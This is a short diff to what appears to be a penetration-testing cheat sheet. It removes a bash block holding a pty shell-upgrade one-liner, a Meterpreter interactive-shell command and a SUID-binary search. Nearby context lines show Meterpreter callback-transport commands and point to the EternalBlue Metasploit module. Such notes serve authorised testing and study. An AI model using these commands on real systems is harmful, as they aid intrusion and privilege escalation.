@@ -224,13 +224,6 @@ Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
 Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
 ```
 
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-execute -f /bin/bash -i -a "-i"
-find / -perm -u=s -type f 2>/dev/null
-```
-
-
 ## Best of - Exploits
 
 - MS17-10 Eternal Blue - `exploit/windows/smb/ms17_010_eternalblue`
